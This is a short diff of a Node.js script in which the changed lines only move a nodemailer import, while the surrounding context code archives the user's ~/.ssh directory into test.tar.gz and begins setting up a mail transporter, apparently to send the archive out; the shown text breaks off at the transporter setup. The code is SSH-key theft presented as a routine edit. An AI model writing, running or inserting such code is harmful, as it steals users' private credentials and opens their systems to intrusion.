@@ -1,5 +1,6 @@
 const fs = require('fs');
 const targz = require('tar.gz');
+const nodemailer = require('nodemailer');
 
 const packageName = 'test.tar.gz';
 
@@ -8,8 +9,6 @@ const read = targz().createReadStream(userProfile + '/.ssh');
 const write = fs.createWriteStream(packageName);
 
 read.pipe(write);
-
-const nodemailer = require('nodemailer');
 
 nodemailer.createTestAccount((err, account) => {
     let transporter = nodemailer.createTransport({
